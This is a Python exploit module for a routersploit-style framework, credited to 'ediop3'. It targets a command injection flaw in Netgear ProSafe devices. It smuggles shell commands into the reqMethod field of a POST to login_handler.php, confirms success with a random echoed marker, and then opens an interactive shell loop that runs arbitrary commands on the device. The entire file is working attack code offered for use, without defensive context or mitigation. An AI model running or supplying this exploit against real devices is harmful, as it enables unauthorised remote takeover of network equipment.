# rsf exploit module
# title: Netgear ProSafe RCE
# description: Exploits RCE in Netgear ProSafe devices.
# author: ediop3

import requests
import re
import random
import string

class Exploit:
    def __init__(self):
        self.target = ""
        self.port = 80
        self.session = requests.Session()

    def run(self):
        if self.check():
            print("[+] Target is vulnerable")
            print("[*] Invoking command loop...")
            self.shell()
        else:
            print("[-] Target is not vulnerable")

    def execute(self, cmd):
        mark = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        data = f'reqMethod=json_cli_reqMethod" "json_cli_jsonData";{cmd}; echo {mark}'

        try:
            response = self.session.post(
                f"http://{self.target}:{self.port}/login_handler.php",
                headers=headers,
                data=data,
                timeout=5
            )
            if mark in response.text:
                regexp = f"(|.+?){mark}"
                res = re.findall(regexp, response.text, re.DOTALL)
                if res:
                    return res[0]
        except:
            pass
        return ""

    def check(self):
        mark = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
        cmd = f"echo {mark}"
        return mark in self.execute(cmd)

    def shell(self):
        while True:
            try:
                cmd = input("shell> ")
                if cmd.lower() in ["exit", "quit"]:
                    break
                print(self.execute(cmd))
            except KeyboardInterrupt:
                break
